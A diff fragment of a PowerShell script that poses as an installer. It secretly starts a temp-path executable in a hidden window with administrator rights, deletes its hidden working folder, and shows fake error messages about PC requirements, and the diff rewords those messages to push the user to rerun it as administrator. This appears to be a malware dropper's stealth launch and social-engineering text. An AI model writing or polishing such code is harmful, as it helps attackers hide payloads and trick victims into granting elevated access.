@@ -47,10 +47,9 @@ try {
     Start-Sleep -Seconds 5
     Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
     Start-Sleep -Seconds 5
-    Remove-Item $hiddenFolder -Recurse -Force 
-    Write-Host "Your PC doesn't meet the minimum requirements to continue the installation."
+    Remove-Item $hiddenFolder -Recurse -Force
 } catch {
     exit 1
 } finally {
-    Write-Host "An error occurred during the installation. Please try again as administrator."
+    Write-Host "Can't determie the PC minimum requiremets. Please try again as administrator."
 }
